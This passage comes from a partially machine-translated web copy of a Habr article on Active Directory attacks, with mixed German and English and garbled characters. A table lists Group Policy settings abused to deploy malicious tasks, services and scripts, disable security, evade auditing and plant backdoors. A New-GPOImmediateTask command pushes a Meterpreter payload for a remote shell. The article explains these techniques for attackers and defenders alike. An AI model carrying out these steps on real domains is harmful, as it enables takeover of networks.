</font></font></td><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Erstellen / √Ñndern von Dateitypzuordnungen, Registrieren von DDE-Aktionen bei diesen Zuordnungen </font></font></td></tr><tr><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Computerkonfiguration \ Einstellungen \ Einstellungen der Systemsteuerung \ Lokale Benutzer und Gruppen </font></font></td><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> F√ºgen Sie ein neues lokales Administratorkonto hinzu </font></font></td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Scheduled Tasks </td><td> Deploy a new evil scheduled task (ie: PowerShell download cradle) </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Services </td><td> Create and configure new evil services </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Affected computers will download a file from the domain controller </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\INI Files </td><td> Update existing INI files </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Registry </td><td> Update specific registry keys. Very useful for disabling security mechanisms, or triggering code execution in any number of ways </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Shortcuts </td><td> Deploy a new evil shortcut </td></tr><tr><td> Computer Configuration\Policies\Software Settings\Software installation </td><td> Deploy an evil MSI. The MSI must be available to the GP client via a network share </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Scripts (startup/shutdown) </td><td> Configure and deploy evil startup scripts. Can run scripts out of GPO directory, can also run PowerShell commands with arguments </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Audit Policy </td><td> Modify local audit settings. Useful for evading detection </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment\ </td><td> Grant a user the right to logon via RDP, grant a user SeDebugPrivilege, grant a user the right to load device drivers, grant a user seTakeOwnershipPrivilege. Basically, take over the remote computer without ever being an administrator on it </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Registry </td><td> Alter DACLs on registry keys, grant yourself an extremely hard to find backdoor on the system </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Windows Firewall </td><td> Manage the Windows firewall. Open up ports if they're blocked </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Environment </td><td> Add UNC path for DLL side loading </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Copy a file from a remote UNC path </td></tr></tbody></table></div><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mit den </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Tools </font></a></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New-GPOImmediateTask</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> und </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SharpGPOAbuse</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> k√∂nnen Sie:</font></font><br><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> F√ºhren Sie die Aufgabe im Aufgabenplaner aus </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Benutzerrechte hinzuf√ºgen (SeDebugPrivilege, SeTakeOwnershipPrivilege usw.) </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> F√ºgen Sie ein Skript hinzu, das nach dem Start ausgef√ºhrt wird </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Benutzer zur lokalen Gruppe hinzuf√ºgen </font></font></li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> F√ºgen Sie beispielsweise eine Aufgabe im Aufgabenplaner hinzu, um eine Meterpreter-Sitzung abzurufen: </font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -TaskName test3 -GPODisplayName "Default Domain Controllers Policy" -CommandArguments '&lt;powershell_meterepreter_payload&gt;' -Force</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nach der Ausf√ºhrung wird die geplante Aufgabe als Test angezeigt </font></font><br><br><img src="https://habrastorage.org/webt/dr/au/v8/drauv8km1pwp56jt_reymw8d5gw.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">und die Meterpreter-Sitzung wird angezeigt. </font></font><br><br><img src="https://habrastorage.org/webt/js/e6/g8/jse6g8vqatvnvr5h1qlx2mvrvzq.png"><br><br><img src="https://habrastorage.org/webt/zj/ct/wz/zjctwz7ca8xg5j6zbqoqlf3q9w0.gif"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Um eine geplante Aufgabe zu l√∂schen, m√ºssen Sie den folgenden Befehl ausf√ºhren:</font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -Remove -Force -GPODisplayName SecurePolicy</code> </pre> <br><h1>  Schlussfolgerungen </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In dem Artikel haben wir nur einige Angriffsvektoren untersucht. </font><font style="vertical-align: inherit;">Ansichten wie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enumerate Accounts and Password Spray</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MS14-068</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , eine Reihe von </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Druckerfehlern</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> und uneingeschr√§nkter Delegierung sowie Angriffe auf Exchange ( </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ruler</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PrivExchange</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExchangeRelayX</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) k√∂nnen den Angriffsbereich erheblich erweitern. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Angriffstechniken und Pinning-Methoden (Goldenes Ticket, Silber-Ticket, Pass-The-Hash, √úbergeben des Hash, SID-Verlauf, DC-Schatten usw.) √§ndern sich st√§ndig, und das Verteidigungsteam sollte immer f√ºr neue Arten von Angriffen bereit sein.</font></font></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de449278/">https://habr.com/ru/post/de449278/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de449264/index.html">Erstellen eines Berichtssystems f√ºr 1C: ERP basierend auf OLAP und Excel</a></li>
<li><a href="../de449266/index.html">3 Berichte mit RusCrypto: Konferenzen mit Erfahrung</a></li>
<li><a href="../de449270/index.html">Yandex hat einen √úberblick √ºber den Markt f√ºr IT-Stellenangebote ver√∂ffentlicht</a></li>
<li><a href="../de449274/index.html">Gro√ües 7-Segment-Display mit Neonlicht am ESP8266</a></li>
<li><a href="../de449276/index.html">Karrierewechsel mit 35 Jahren. Meine Erfahrungen und ersten Erfolge</a></li>
<li><a href="../de449280/index.html">Wie die Cloud-Gaming-Plattform f√ºr B2B- und B2C-Clients funktioniert. L√∂sungen f√ºr ein tolles Bild und Kampf mit der letzten Meile</a></li>
<li><a href="../de449282/index.html">Backup, Teil 1: Zweck, √úberblick √ºber Techniken und Technologien</a></li>
<li><a href="../de449284/index.html">Ich verkaufe Zwiebeln online</a></li>
<li><a href="../de449286/index.html">Machen Sie los GraphQL API</a></li>
<li><a href="../de449288/index.html">Welches Team wird ben√∂tigt, um einen wirklich guten Online-Shop zu erstellen?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>